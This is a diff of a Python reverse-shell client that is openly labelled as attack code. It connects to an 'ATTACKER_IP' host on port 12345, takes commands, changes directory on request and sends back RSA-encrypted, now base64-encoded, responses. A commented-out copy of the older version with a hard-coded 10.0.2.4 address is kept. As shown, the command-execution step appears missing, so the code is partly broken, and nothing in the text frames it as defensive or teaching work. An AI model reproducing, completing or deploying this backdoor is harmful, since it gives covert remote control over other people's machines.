@@ -89,12 +89,37 @@
 #         s.send(b' ')
 # s.close()
 
+# from cryptidy import asymmetric_encryption
+# import socket
+# import subprocess
+# import os
+
+# HOST = '10.0.2.4'  # Attacker's IP address
+# PORT = 12345  # Same port number used in the listener
+# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# s.connect((HOST, PORT))
+
+# priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
+
+# while True:
+#     data = s.recv(1024)
+#     if data[:2].decode('utf-8') == 'cd':
+#         os.chdir(data[3:].decode('utf-8'))
+#     if len(data) > 0:
+#         encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
+#         s.send(encrypted_data)
+#     else:
+#         s.send(b' ')
+# s.close()
+
+# updated code
 from cryptidy import asymmetric_encryption
 import socket
 import subprocess
 import os
+import base64
 
-HOST = '10.0.2.4'  # Attacker's IP address
+HOST = 'ATTACKER_IP'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
@@ -107,8 +132,8 @@ while True:
         os.chdir(data[3:].decode('utf-8'))
     if len(data) > 0:
         encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
-        s.send(encrypted_data)
+        encrypted_data_b64 = base64.b64encode(encrypted_data)
+        s.send(encrypted_data_b64)
     else:
         s.send(b' ')
 s.close()
-
